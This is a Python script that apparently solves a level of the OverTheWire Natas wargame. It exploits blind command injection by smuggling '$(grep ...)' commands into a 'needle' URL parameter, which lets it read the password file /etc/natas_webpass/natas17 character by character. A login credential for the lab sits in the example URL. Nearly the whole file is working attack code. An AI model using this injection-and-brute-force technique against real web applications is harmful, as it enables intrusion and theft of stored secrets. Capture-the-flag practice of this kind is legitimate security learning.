from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def url_command_brute(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "Output:\n<pre>\n</pre>"

	for c in all_chars:
		# Command injection #1 - using the word "bypassed" as the known word
		req = requests.get(target + '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)bypassed')

		# Verify if password uses current character
		if req.content.find(exists) != -1:
			parsed_chars += c
			print "[*] Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			# Command injection #2
			# The ^ is used to grab only what matches what follows after it
			req = requests.get(target+'?needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)bypassed')
		
			# Figuring out the correct location of characters in the password
			if req.content.find(exists) != -1:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	url_command_brute(target)

main()

